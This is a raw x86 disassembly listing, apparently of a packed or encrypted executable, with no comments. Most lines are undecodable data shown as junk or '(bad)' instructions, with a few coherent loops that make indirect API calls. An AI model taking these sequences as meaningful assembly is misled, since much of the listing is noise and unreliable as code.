  402126:	mov    ch,0xaf
  402128:	mov    cl,0xa1
  40212a:	sub    dl,bl
  40212c:	pop    edi
  40212d:	or     al,0xd8
  40212f:	jl     0x402150
  402131:	js     0x4020bf
  402133:	call   0x63f0:0xc62ec1a2
  40213a:	aaa    
  40213b:	jno    0x402147
  40213d:	fsub   st(7),st
  40213f:	mov    fs,edi
  402141:	ins    BYTE PTR es:[edi],dx
  402142:	dec    ebp
  402143:	in     al,dx
  402144:	pushf  
  402145:	jg     0x4021ba
  402147:	inc    edx
  402148:	sub    ecx,edx
  40214a:	or     BYTE PTR [edi-0x1e21edb4],bl
  402150:	push   esp
  402151:	or     bh,ch
  402153:	fstp   DWORD PTR [eax-0x1413a2b0]
  402159:	adc    eax,0x9a929ee0
  40215e:	cmp    DWORD PTR [esi+0x44],ebp
  402161:	mov    edx,0x9f0f8a8c
  402166:	push   edx
  402167:	mov    cl,0x19
  402169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40216a:	mov    bl,0x13
  40216c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40216e:	mov    dh,0xbd
  402170:	mov    edx,0x51f947bb
  402175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402176:	lods   al,BYTE PTR ss:[esi]
  402178:	or     al,0x98
  40217a:	fmul   DWORD PTR [esp+edx*8+0x5aebc525]
  402181:	das    
  402182:	fbstp  TBYTE PTR [edx+0x7f]
  402185:	ins    BYTE PTR es:[edi],dx
  402186:	(bad)  
  402187:	or     ah,cl
  402189:	test   DWORD PTR [ebx+0x30],esp
  40218c:	dec    ebp
  40218d:	inc    edx
  40218e:	ja     0x4021f2
  402190:	cdq    
  402191:	jbe    0x4021ef
  402193:	inc    edi
  402194:	das    
  402195:	xlat   BYTE PTR ds:[ebx]
  402196:	dec    edx
  402197:	bound  edi,QWORD PTR [eax+esi*4+0x704037ce]
  40219e:	fisubr WORD PTR [ebp+0x68964a8d]
  4021a4:	sbb    eax,0x87b4f685
  4021a9:	scas   al,BYTE PTR es:[edi]
  4021aa:	push   0x1be71408
  4021af:	jle    0x4021c2
  4021b1:	in     eax,dx
  4021b2:	aas    
  4021b3:	sub    esi,DWORD PTR [esi+ebx*2]
  4021b6:	xchg   esi,eax
  4021b7:	cmp    BYTE PTR [ebp+0x742b5cc4],dl
  4021bd:	neg    ebp
  4021bf:	(bad)  
  4021c1:	mov    bl,BYTE PTR [edi]
  4021c3:	pushf  
  4021c4:	ins    BYTE PTR es:[edi],dx
  4021c5:	(bad)  
  4021c6:	in     al,dx
  4021c7:	mov    esi,0x53a2a378
  4021cc:	cwde   
  4021cd:	(bad)  [edi+0x17]
  4021d0:	je     0x40218d
  4021d2:	mov    dh,0xe7
  4021d4:	inc    ecx
  4021d5:	(bad)  
  4021d6:	(bad)  
  4021d7:	mov    edx,0x3cfb7a4f
  4021dc:	cwde   
  4021dd:	or     al,0xcd
  4021df:	sbb    DWORD PTR [edi-0x43],edi
  4021e2:	stos   DWORD PTR es:[edi],eax
  4021e3:	fld    QWORD PTR [esi+0x7a]
  4021e6:	pop    ecx
  4021e7:	pop    ds
  4021e8:	pop    ss
  4021e9:	mov    al,0xd7
  4021eb:	jne    0x40222e
  4021ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ee:	dec    edx
  4021ef:	sub    BYTE PTR [ebp+0x2b],ch
  4021f2:	dec    eax
  4021f3:	test   eax,0xf688daa
  4021f8:	jb     0x4021a7
  4021fa:	shl    ah,1
  4021fc:	ret    
  4021fd:	dec    esp
  4021fe:	and    eax,0x464c9138
  402203:	(bad)  
  402204:	xor    eax,0x1ee7d662
  402209:	(bad)
  40220e:	(bad)  
  40220f:	daa    
  402210:	stos   BYTE PTR es:[edi],al
  402211:	test   eax,esi
  402213:	rcr    BYTE PTR [ecx],0xc6
  402216:	xor    cl,0x56
  402219:	nop
  40221a:	mov    ds:0xa5528e1,al
  40221f:	and    eax,0xe71f4e31
  402224:	les    eax,FWORD PTR [edx+0x1ce8ea42]
  40222a:	(bad)
  40222d:	jp     0x4021e4
  40222f:	sahf   
  402230:	test   eax,0x7aac158f
  402235:	outs   dx,DWORD PTR ds:[esi]
  402236:	mov    WORD PTR [esi-0x4c82213f],?
  40223c:	cmp    ch,BYTE PTR [ebx+0x2c1f17a7]
  402242:	popa   
  402243:	int    0x9
  402245:	fs iret 
  402247:	sub    ah,cl
  402249:	enter  0x2d7e,0x46
  40224d:	and    esp,edx
  40224f:	sub    al,0x82
  402251:	out    dx,eax
  402252:	enter  0x3301,0x3
  402256:	aaa    
  402257:	das    
  402258:	out    dx,al
  402259:	mov    ebp,0x36a1345c
  40225e:	in     al,0x4b
  402260:	out    0x70,eax
  402262:	mov    al,ds:0x5b97fac6
  402267:	jle    0x402253
  402269:	xchg   esp,eax
  40226a:	or     DWORD PTR [edx],ebp
  40226c:	jmp    0x28466333
  402271:	cli    
  402272:	fisttp QWORD PTR [ebx]
  402274:	in     eax,0xc9
  402276:	sbb    BYTE PTR [edx+0x1d],cl
  402279:	cmp    BYTE PTR ds:0x151d86b5,cl
  40227f:	cli    
  402280:	aam    0xd7
  402282:	cdq    
  402283:	or     al,BYTE PTR [ebx]
  402285:	mov    dl,0xfc
  402287:	pop    ds
  402288:	adc    BYTE PTR [edi],ch
  40228a:	inc    DWORD PTR [esi]
  40228c:	ror    DWORD PTR ds:0xcbc8bd84,cl
  402292:	mov    ebp,0xb0081e1c
  402297:	mov    ebp,0x5e02dd46
  40229c:	mov    esi,0x3031e62e
  4022a1:	inc    esi
  4022a2:	jge    0x402290
  4022a4:	xor    al,0xcd
  4022a6:	xchg   edi,eax
  4022a7:	stc    
  4022a8:	jae    0x4022cc
  4022aa:	imul   ebx,esi,0x1e646e14
  4022b0:	fnsave [edx]
  4022b2:	in     al,dx
  4022b3:	pop    edi
  4022b4:	xchg   ebp,eax
  4022b5:	cdq    
  4022b6:	scas   eax,DWORD PTR es:[edi]
  4022b7:	adc    al,0xee
  4022b9:	push   edi
  4022ba:	call   0x27389c5c
  4022bf:	ins    BYTE PTR es:[edi],dx
  4022c0:	pop    eax
  4022c1:	cli    
  4022c2:	mov    ds:0xc5388096,al
  4022c7:	retf   0x88e5
  4022ca:	hlt    
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42edef,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42edef
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42edef,edx
  4022e3:	cmp    DWORD PTR ds:0x42edef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e9bf
  4022fe:	cmp    DWORD PTR ds:0x42edef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430441,0x1f
  402315:	cmp    DWORD PTR ds:0x430441,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430441,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e9af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430441
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430441,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	push   edi
  402362:	sbb    eax,0x3db5cc0
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023a0
  40236e:	xchg   ecx,eax
  40236f:	das    
  402370:	dec    eax
  402371:	push   0xc9d7c382
  402376:	mov    ds:0x662136ec,eax
  40237b:	mov    ecx,0x983dc89
  402380:	rcr    BYTE PTR [ebx-0x51],0x93
  402384:	sub    eax,0x364f4ced
  402389:	fs in  al,dx
  40238b:	scas   al,BYTE PTR es:[edi]
  40238c:	mov    edi,0x2b2afca6
  402391:	imul   DWORD PTR [ebx-0x62]
  402394:	stos   BYTE PTR es:[edi],al
  402395:	popf   
  402396:	fdivr  DWORD PTR [eax+ebx*8+0x61]
  40239a:	adc    dh,BYTE PTR [edx]
  40239c:	xchg   esp,eax
  40239d:	mov    edx,0xe7d657ea
  4023a2:	and    eax,0xbdc4d8f0
  4023a7:	mov    DWORD PTR [esi],eax
  4023a9:	call   0x8909943f
  4023ae:	or     dl,bh
  4023b0:	std    
  4023b1:	enter  0x3860,0x7b
  4023b5:	push   edi
  4023b6:	cmp    DWORD PTR ds:0x7b87bb89,edi
  4023bc:	cwde   
  4023bd:	cs and esp,ebx
  4023c0:	sbb    eax,0x5eb16ec7
  4023c5:	sti    
  4023c6:	inc    ebp
  4023c7:	clc    
  4023c8:	iret   
  4023c9:	pop    es
  4023ca:	jmp    0xecd8e4b9
  4023cf:	and    eax,0xe160cc1
  4023d4:	dec    edx
  4023d5:	mov    DWORD PTR [eax-0x25],esp
  4023d8:	mov    dl,BYTE PTR [esi*1+0x40cd5e4d]
  4023df:	pop    es
  4023e0:	rcl    ebp,cl
  4023e2:	mov    bh,0x6c
  4023e4:	and    DWORD PTR [edi+0x75c078d2],edi
  4023ea:	xor    al,0xf9
  4023ec:	fwait
  4023ed:	cmp    eax,0xbb08d9fe
  4023f2:	cmp    al,BYTE PTR [eax+0x2b]
  4023f5:	mov    ds:0x3923f205,eax
  4023fa:	cmc    
  4023fb:	scas   al,BYTE PTR es:[edi]
  4023fc:	sbb    ah,BYTE PTR [esi+0x7f297245]
  402402:	addr16 (bad) 
  402404:	not    BYTE PTR [ebx+0x7fafa422]
  40240a:	test   BYTE PTR [ebp+edx*4-0x38cf05e6],ah
  402411:	sub    eax,0x42b09e1e
  402416:	adc    BYTE PTR [ebp+0x41aac325],bl
  40241c:	jmp    0x4023bf
  40241e:	mov    cl,0x9f
  402420:	dec    DWORD PTR [eax+0x78]
  402423:	and    ebp,ebp
  402425:	xor    dl,BYTE PTR [edx-0x44a85d82]
  40242b:	mov    ah,BYTE PTR ds:0x71318d35
  402431:	sti    
  402432:	or     BYTE PTR [ebp-0x46],ah
  402435:	sub    DWORD PTR [edi+0x6f],0x3c82472d
  40243c:	fsub   DWORD PTR [eax]
  40243e:	jae    0x4023c2
  402440:	inc    ebp
  402441:	jge    0x4023fd
  402443:	pop    ds
  402444:	test   BYTE PTR [edx+0x682d8db6],ah
  40244a:	ret    0x6fa6
  40244d:	hlt    
  40244e:	and    DWORD PTR [edx+edx*4+0x35],ecx
  402452:	test   al,0xaa
  402455:	jmp    0xb488:0x83a790c2
  40245c:	sbb    al,0xb0
  40245e:	pop    esi
  40245f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402460:	cmp    BYTE PTR [ebp+0x29f4b602],dl
  402466:	aad    0xec
  402468:	call   0x250313e8
  40246d:	jb     0x402419
  40246f:	cld    
  402470:	inc    ecx
  402471:	xlat   BYTE PTR ds:[ebx]
  402472:	cdq    
  402473:	and    eax,0x5e8dfdd9
  402478:	jmp    0x5ff4d167
  40247d:	mov    ebp,0x12768b9d
  402482:	leave  
  402483:	and    eax,0xfbe5d93b
  402488:	sahf   
  402489:	popf   
  40248a:	and    bh,BYTE PTR [edi]
  40248c:	xor    ebx,DWORD PTR [edi-0x46]
  40248f:	ins    DWORD PTR es:[edi],dx
  402490:	dec    ebp
  402491:	test   al,ah
  402493:	jbe    0x402486
  402495:	pop    ecx
  402496:	test   BYTE PTR [esi],0xb5
  402499:	or     al,BYTE PTR [edi+0x1d48b9b6]
  40249f:	jecxz  0x402486
  4024a1:	(bad)  
  4024a2:	sbb    al,0xdb
  4024a4:	sub    DWORD PTR [ebp-0x4c],esi
  4024a7:	jno    0x402527
  4024a9:	(bad)  
  4024aa:	shl    BYTE PTR [esp+edi*2],0xdc
  4024ae:	fs bnd call 0x9aae1f1b
  4024b5:	sar    DWORD PTR [ebx-0x38556029],0x79
  4024bc:	xor    BYTE PTR [edi+ebp*4+0x1cfde1bc],cl
  4024c3:	popa   
  4024c4:	jge    0x402505
  4024c6:	or     cl,dh
  4024c8:	cmp    ecx,DWORD PTR [eax-0x3a]
  4024cb:	fiadd  WORD PTR [eax-0x60250076]
  4024d1:	push   esi
  4024d2:	adc    cl,bh
  4024d4:	imul   ebp,DWORD PTR [eax+0x26],0xffffffa5
  4024d8:	repnz sti 
  4024da:	int    0xc3
  4024dc:	sbb    bh,BYTE PTR [ecx+0x60]
  4024df:	xlat   BYTE PTR ds:[ebx]
  4024e0:	cli    
  4024e1:	test   BYTE PTR [eax-0x7c4d26ea],dh
  4024e7:	xchg   ebp,eax
  4024e8:	jne    0x40253d
  4024ea:	jns    0x40253f
  4024ec:	push   cs
  4024ed:	ss mov esi,0x6fea76c
  4024f3:	out    dx,al
  4024f4:	push   ebx
  4024f5:	outs   dx,DWORD PTR ds:[esi]
  4024f6:	out    dx,eax
  4024f7:	in     al,dx
  4024f8:	cs nop
  4024fa:	jp     0x402538
  4024fc:	aas    
  4024fd:	xchg   ebp,eax
  4024fe:	test   BYTE PTR [esi+0x31e71ba4],0x55
  402505:	imul   DWORD PTR ds:0x77cdf051
  40250b:	pop    ss
  40250c:	xor    DWORD PTR [edx-0x3a],esp
  40250f:	dec    edi
  402510:	jle    0x402577
  402512:	mov    bl,0x90
  402514:	fwait
  402515:	mov    dl,0xcb
  402517:	fwait
  402518:	or     eax,0xa2d00460
  40251d:	imul   edi,edi,0x39
  402520:	test   eax,0x1bdaf99b
  402525:	jg     0x40252e
  402527:	jmp    0x40259c
  402529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252a:	nop
  40252b:	xor    ecx,DWORD PTR [ebp-0x6b87e1a6]
  402531:	jecxz  0x40253d
  402533:	or     BYTE PTR [ebx+edx*2-0x5401a71c],ah
  40253a:	xchg   BYTE PTR [edx+0x3f],ch
  40253d:	push   esp
  40253e:	jge    0x402507
  402540:	iret   
  402541:	dec    ebx
  402542:	pop    edi
  402543:	dec    esi
  402544:	popa   
  402545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402546:	cmp    al,0x27
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42edcb,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42edf3
  40255f:	xor    edx,DWORD PTR ds:0x42edcf
  402565:	mov    DWORD PTR ds:0x42edf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430465,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430445
  402592:	and    DWORD PTR ds:0x42edd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4304cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4304cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4304cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4304cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4304cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e846
  4025d7:	call   DWORD PTR ds:0x42e9c3
  4025dd:	cmp    DWORD PTR ds:0x4304cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4304cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4304cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	call   FWORD PTR fs:[edi+0x13eba78]
  402618:	jle    0x402698
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x402603
  40261f:	test   eax,0xee9686d1
  402624:	les    esp,FWORD PTR ds:0x7923c3be
  40262a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40262b:	mul    bl
  40262d:	ja     0x4025c3
  40262f:	dec    ecx
  402630:	(bad)  
  402631:	cmp    BYTE PTR [edi],bh
  402633:	mov    bl,BYTE PTR [ebx]
  402635:	pop    edi
  402636:	pop    ds
  402637:	cwde   
  402638:	pop    esp
  402639:	jle    0x40268e
  40263b:	inc    ebp
  40263c:	xor    al,0xb1
  40263e:	mov    ah,0x23
  402640:	ret    0xc5e9
  402643:	jb     0x40260a
  402645:	sbb    BYTE PTR [edx],bh
  402647:	pop    edi
  402648:	adc    BYTE PTR [ebx+0x52],0x9f
  40264c:	or     DWORD PTR [ecx-0x44161129],esi
  402652:	mov    bl,0x2d
  402654:	mov    eax,0x17ebd0eb
  402659:	xor    al,0x20
  40265b:	shl    dl,cl
  40265d:	sbb    eax,0x8e3e9ac1
  402662:	xchg   ebp,eax
  402664:	mov    ch,0xdc
  402666:	nop
  402667:	dec    ecx
  402668:	js     0x4026e0
  40266a:	and    esp,DWORD PTR [ebx+0x30]
  40266d:	out    0x78,eax
  40266f:	xchg   DWORD PTR [edx+0x68],edi
  402672:	mov    eax,0xbf1d28cb
  402677:	je     0x40269f
  402679:	(bad)  
  40267b:	xchg   ebx,eax
  40267c:	mov    fs,WORD PTR [ecx-0x4ddd2b3a]
  402682:	popf   
  402683:	mov    ds:0x69e4d076,eax
  402688:	cmp    ebx,ecx
  40268a:	fcomp  st(4)
  40268c:	xor    bl,BYTE PTR [edi+0x124ed332]
  402692:	and    eax,0x6f05b6c9
  402697:	push   ebx
  402698:	push   edi
  402699:	push   esi
  40269a:	dec    edx
  40269b:	bound  ecx,QWORD PTR [edx]
  40269d:	in     al,0xe0
  40269f:	out    0xe6,al
  4026a1:	jno    0x402625
  4026a3:	adc    DWORD PTR [edx-0x32],ecx
  4026a6:	shr    DWORD PTR [ebx-0x66f46282],0xf9
  4026ad:	inc    eax
  4026ae:	dec    edi
  4026af:	or     dh,BYTE PTR [ecx+eax*4+0x75f53ff4]
  4026b6:	mov    dl,0x70
  4026b8:	jg     0x40264f
  4026ba:	pop    ebx
  4026bb:	cli    
  4026bc:	dec    ebp
  4026bd:	or     edx,esi
  4026bf:	sbb    al,0xc3
  4026c1:	mov    ds:0x3f56bcc3,eax
  4026c6:	jne    0x40272b
  4026c8:	fadd   DWORD PTR [eax]
  4026ca:	ja     0x402747
  4026cc:	leave  
  4026cd:	loope  0x402709
  4026cf:	loope  0x402723
  4026d1:	leave  
  4026d2:	cwde   
  4026d3:	mov    cl,0x9a
  4026d5:	mov    al,ds:0x6622e327
  4026da:	pop    ds
  4026db:	adc    BYTE PTR [ebx+ebp*2+0x1b8787e0],ch
  4026e2:	xchg   edx,eax
  4026e3:	xchg   BYTE PTR [edx],dl
  4026e5:	aas    
  4026e6:	sbb    cl,BYTE PTR [eax-0x500944d8]
  4026ec:	arpl   WORD PTR [edi],dx
  4026ee:	daa    
  4026ef:	mov    ds:0x1bd229ce,eax
  4026f4:	out    0x56,eax
  4026f6:	xchg   esi,eax
  4026f7:	jb     0x4026fb
  4026f9:	repnz pop edx
  4026fb:	cmp    BYTE PTR [ebp+0x75],0xf7
  4026ff:	(bad)  
  402700:	xchg   ebp,eax
  402701:	lock cmp edi,eax
  402704:	add    dh,BYTE PTR [ebp-0x52]
  402707:	shl    DWORD PTR [edx+0x30],cl
  40270a:	int    0x43
  40270c:	and    bl,BYTE PTR [edi+eiz*8]
  40270f:	sbb    ch,BYTE PTR [esi+ebx*2]
  402712:	adc    esi,DWORD PTR [edi]
  402714:	and    bl,0x35
  402717:	push   0x7d
  402719:	adc    BYTE PTR [ecx+esi*1],al
  40271c:	repnz sub DWORD PTR [ecx-0x94ebb42],ebp
  402723:	jne    0x402704
  402725:	xchg   ebx,eax
  402726:	inc    edx
  402727:	push   esi
  402728:	lods   eax,DWORD PTR ds:[esi]
  402729:	or     al,BYTE PTR [edx]
  40272b:	adc    eax,0x5468771a
  402730:	(bad)  
  402731:	xor    ebx,DWORD PTR [ecx+eax*4+0x14ee7788]
  402738:	les    edx,FWORD PTR [eax]
  40273a:	sub    al,0x77
  40273c:	add    dh,BYTE PTR [ebp+0xc901e32]
  402742:	jae    0x4026f7
  402744:	or     al,0x90
  402746:	int3   
  402747:	or     eax,0x5e72cc63
  40274c:	pop    edi
  40274d:	daa    
  40274e:	mov    ecx,0xfeb6d73a
  402753:	xchg   esp,eax
  402754:	fistp  WORD PTR [esi+edx*8-0x1183d8a7]
  40275b:	sub    BYTE PTR [edx+0x38580203],0xbe
  402762:	jb     0x4027c9
  402764:	(bad)  
  402765:	js     0x402749
  402767:	add    eax,0x9fa45230
  40276c:	push   ebx
  40276d:	jge    0x402755
  40276f:	test   BYTE PTR ds:0x2766d210,al
  402775:	sbb    BYTE PTR [ebx+0x66],0xa9
  402779:	mov    ecx,0x99790792
  40277e:	xor    DWORD PTR [ecx+0x73],edi
  402781:	mov    ebx,?
  402783:	or     eax,0xe53f7c85
  402788:	inc    ebp
  402789:	and    DWORD PTR [ebx],ebp
  40278b:	(bad)  
  40278c:	mov    ds:0xe9a6bf46,eax
  402791:	jge    0x4027af
  402793:	adc    bl,BYTE PTR [esi+0x155d7f86]
  402799:	les    ebp,FWORD PTR [esi+0x1636faa6]
  40279f:	sbb    DWORD PTR [ecx-0x76ab4530],ebx
  4027a5:	icebp  
  4027a6:	js     0x40280d
  4027a8:	xchg   ecx,eax
  4027a9:	leave  
  4027aa:	call   edx
  4027ac:	popf   
  4027ad:	mov    ds:0xea5f36c6,al
  4027b2:	sahf   
  4027b3:	fisttp QWORD PTR ds:0xde0c43d6
  4027b9:	(bad)  
  4027bb:	mov    ebp,0xd99704b4
  4027c0:	push   ecx
  4027c1:	mov    eax,ds:0x6b186470
  4027c6:	jecxz  0x40280f
  4027c8:	(bad)  
  4027c9:	jbe    0x402824
  4027cb:	jmp    0x40277a
  4027cd:	and    BYTE PTR [esi+0x28667e8d],0xcf
  4027d4:	and    ecx,ebx
  4027d6:	pop    edx
  4027d7:	ret    
  4027d8:	cmp    al,0xb7
  4027da:	clc    
  4027db:	iret   
  4027dc:	repnz sub eax,0xb3a7adc8
  4027e2:	push   0x8056153f
  4027e7:	retf   0xcc02
  4027ea:	dec    edi
  4027eb:	inc    edx
  4027ec:	add    DWORD PTR [ebx+0x55e7fc03],ebp
  4027f2:	js     0x40281c
  4027f4:	add    esi,DWORD PTR [eax]
  4027f6:	pop    esp
  4027f7:	mov    DWORD PTR ds:0x107d8b57,edi
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [ebp+0x1519a271],esp
  40282c:	movd   DWORD PTR [esi+0x55],mm7
  402830:	jg     0x4028b0
  402832:	jle    0x40283b
  402834:	mov    al,0x3f
  402836:	in     al,dx
  402837:	ins    DWORD PTR es:[edi],dx
  402838:	xchg   ebp,eax
  402839:	pop    edi
  40283a:	xor    al,0xf7
  40283c:	mov    dl,0xe8
  40283e:	retf   
  40283f:	nop
  402840:	mov    esi,0x9a1bb704
  402845:	inc    edx
  402846:	adc    al,0x84
  402848:	test   al,0x12
  40284a:	cmp    BYTE PTR [edx],al
  40284c:	mov    ecx,ebp
  40284e:	push   esp
  40284f:	shr    BYTE PTR [eax],1
  402851:	xchg   edx,eax
  402852:	cmc    
  402853:	(bad)  
  402854:	mov    edi,0x290eca98
  402859:	jecxz  0x4027ed
  40285b:	out    0xe9,al
  40285d:	and    ah,ah
  40285f:	or     eax,0x473ca00a
  402864:	or     bh,al
  402866:	mov    DWORD PTR [edi+0x26],edi
  402869:	je     0x4028ac
  40286b:	idiv   BYTE PTR [ebx+0x8]
  40286e:	add    DWORD PTR [eax+0x162b92e],edx
  402874:	sub    dl,ch
  402876:	or     al,0xc
  402878:	into   
  402879:	in     eax,0x60
  40287b:	mov    edi,0xc580b571
  402880:	cli    
  402881:	sbb    al,0x3b
  402883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402884:	stos   BYTE PTR es:[edi],al
  402885:	mov    ah,0xb2
  402887:	pop    edx
  402888:	pop    edx
  402889:	lds    ebx,FWORD PTR [eax+0x3c7a6c5d]
  40288f:	je     0x402827
  402891:	xchg   edx,eax
  402892:	ds mov ah,0x94
  402895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402896:	mov    ecx,0xd086677
  40289b:	test   al,0x56
  40289d:	fidivr DWORD PTR [eax-0x31b2a89a]
  4028a3:	lea    ecx,[edi]
  4028a5:	aas    
  4028a6:	mov    al,0x83
  4028a8:	mov    ebx,0x543f67e7
  4028ad:	in     eax,0x6e
  4028af:	xchg   ebp,eax
  4028b0:	mov    DWORD PTR ds:0x903e4f73,ebx
  4028b6:	(bad)  
  4028b7:	addr16 out dx,al
  4028b9:	adc    DWORD PTR [eax-0x2f],esi
  4028bc:	sub    DWORD PTR [edx-0x71],esp
  4028bf:	cs xor eax,ebp
  4028c2:	adc    esi,ecx
  4028c4:	mov    ecx,0xab74eab2
  4028c9:	in     al,0xda
  4028cb:	sub    al,0xa9
  4028cd:	out    dx,eax
  4028ce:	cmp    BYTE PTR [ebx-0x69],ah
  4028d1:	test   eax,0x38a087ab
  4028d6:	inc    ebx
  4028d7:	out    dx,eax
  4028d8:	in     eax,0x91
  4028da:	or     bl,BYTE PTR [eax]
  4028dc:	fwait
  4028dd:	repnz int 0x45
  4028e0:	or     eax,0xe044c3c1
  4028e5:	mov    dl,0xcd
  4028e7:	push   ss
  4028e8:	fs adc eax,0x324e3254
  4028ee:	xor    edi,edi
  4028f0:	rol    dh,1
  4028f2:	pop    edi
  4028f3:	mov    ah,0x54
  4028f5:	dec    ebx
  4028f6:	addr16 mov eax,ds:0xe90a
  4028fa:	pop    esi
  4028fb:	iret   
  4028fc:	mov    ch,0x90
  4028fe:	adc    DWORD PTR [edx],edi
  402900:	xor    eax,DWORD PTR ds:0x4fba92a7
  402906:	or     al,0x71
  402908:	pop    ds
  402909:	aad    0x24
  40290b:	sbb    al,0x52
  40290d:	dec    ebx
  40290e:	fwait
  40290f:	jne    0x40293f
  402911:	icebp  
  402912:	xor    al,dh
  402914:	out    dx,al
  402915:	xchg   ecx,eax
  402916:	push   edi
  402917:	ret    0xa139
  40291a:	xchg   ebp,eax
  40291b:	xchg   edx,eax
  40291c:	fdiv   DWORD PTR [ebx+eiz*8+0x236fb38]
  402923:	(bad)  
  402924:	cmp    ah,bh
  402926:	push   edx
  402927:	dec    ebp
  402928:	and    eax,0x64175e09
  40292d:	sbb    edi,0xd4f3e138
  402933:	push   ebp
  402934:	dec    edx
  402935:	sub    al,0xf0
  402937:	sub    al,0xcb
  402939:	jae    0x4028e3
  40293b:	or     al,0x73
  40293d:	and    al,0xe0
  40293f:	ret    
  402940:	and    cl,BYTE PTR [eax+0x21]
  402943:	dec    ebx
  402944:	mov    ch,0x46
  402946:	mov    ecx,0x253c340d
  40294b:	cmp    eax,0x2e2f1433
  402950:	sbb    BYTE PTR ds:0xaa1a148f,bl
  402956:	adc    edx,esp
  402958:	jmp    0x42ec94e2
  40295d:	dec    eax
  40295e:	shl    BYTE PTR [edi+0x598f1a05],1
  402964:	sub    BYTE PTR [eax],al
  402966:	adc    al,0x40
  402968:	ins    BYTE PTR es:[edi],dx
  402969:	fwait
  40296a:	daa    
  40296b:	js     0x40294b
  40296d:	xchg   ecx,eax
  40296e:	enter  0x5cef,0x95
  402972:	jl     0x402949
  402974:	pop    edi
  402975:	shl    edx,1
  402977:	push   eax
  402978:	div    BYTE PTR [eax-0x49]
  40297b:	mov    bl,0xdd
  40297d:	jbe    0x4029b6
  40297f:	mov    ch,0x0
  402981:	and    eax,0xf5c2f1d
  402986:	mov    esp,edx
  402988:	adc    ch,al
  40298a:	(bad)  
  40298b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40298c:	test   eax,0xcc6f176c
  402991:	in     al,dx
  402992:	sbb    ch,BYTE PTR [ebp+0x34]
  402995:	xor    ch,dl
  402997:	fwait
  402998:	gs dec edi
  40299a:	das    
  40299b:	inc    esp
  40299c:	fcom   DWORD PTR [eax]
  40299e:	mov    ds,WORD PTR [ebx]
  4029a0:	rol    BYTE PTR ds:0x109d644,0x4a
  4029a7:	sbb    BYTE PTR [edx+0x20c55137],dl
  4029ad:	cmp    al,0x7a
  4029af:	es mov bh,dl
  4029b2:	mov    al,ds:0xcc812b15
  4029b7:	inc    edx
  4029b8:	or     ebp,edi
  4029ba:	(bad)  [eax]
  4029bc:	sub    ebp,esi
  4029be:	and    DWORD PTR [ebp-0x69594c7e],ecx
  4029c4:	(bad)  
  4029c5:	icebp  
  4029c6:	int    0xff
  4029c8:	xor    ah,ah
  4029ca:	ins    BYTE PTR es:[edi],dx
  4029cb:	mov    ebx,0xd5621a2
  4029d0:	enter  0xfc5d,0x7e
  4029d4:	stos   DWORD PTR es:[edi],eax
